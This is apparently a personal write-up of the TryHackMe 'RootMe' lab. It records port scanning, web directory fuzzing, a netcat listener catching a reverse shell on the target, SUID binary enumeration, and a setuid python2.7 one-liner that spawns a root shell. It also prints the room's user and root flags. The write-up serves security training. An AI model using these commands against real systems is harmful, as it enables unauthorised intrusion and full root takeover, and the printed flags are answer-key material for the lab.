---
title: "RootMe"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Easy"
date: 2026-05-05
url: "https://tryhackme.com/room/rrootme"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 99f759b927518213a9fe813c8cb07489
---

# RootMe

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.139.101
                                                           ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 16:09 IST
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.21% done; ETC: 16:10 (0:00:36 remaining)
Warning: 10.48.139.101 giving up on port because retransmission cap hit (6).
Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 89.18% done; ETC: 16:11 (0:00:13 remaining)
Nmap scan report for 10.48.139.101
Host is up (0.0089s latency).
Not shown: 58653 closed tcp ports (reset), 6880 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.98 seconds
```

```bash
ffuf -u "http://10.48.139.101/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.139.101/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 855ms]
css                     [Status: 200, Size: 1126, Words: 70, Lines: 18, Duration: 8ms]
js                      [Status: 200, Size: 959, Words: 65, Lines: 17, Duration: 8ms]
panel                   [Status: 200, Size: 732, Words: 175, Lines: 23, Duration: 66ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9ms]
uploads                 [Status: 200, Size: 744, Words: 52, Lines: 16, Duration: 11ms]
:: Progress: [20481/20481] :: Job [1/1] :: 4878 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

![[attachments/TryHackMe Rooms/TryHackMe/RootMe/image.png]]

![[attachments/TryHackMe Rooms/TryHackMe/RootMe/image 1.png]]

![[attachments/TryHackMe Rooms/TryHackMe/RootMe/image 2.png]]

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.158.240] from (UNKNOWN) [10.48.139.101] 43444
Linux ip-10-48-139-101 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
11:02:14 up 43 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```bash
www-data@ip-10-48-139-101:/$ cd /var/www
cd /var/www
www-data@ip-10-48-139-101:/var/www$ ls
ls
html  user.txt
www-data@ip-10-48-139-101:/var/www$ cat user.txt
cat user.txt
THM{y0u_g0t_a_sh3ll}
```

## Root Flag

```bash
www-data@ip-10-48-163-190:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```

```bash
www-data@ip-10-48-163-190:/home/ubuntu$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ip-10-48-163-190:/home/ubuntu# whoami
root
root@ip-10-48-163-190:/home/ubuntu# cd /root
root@ip-10-48-163-190:/root# ls
root.txt  snap
root@ip-10-48-163-190:/root# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
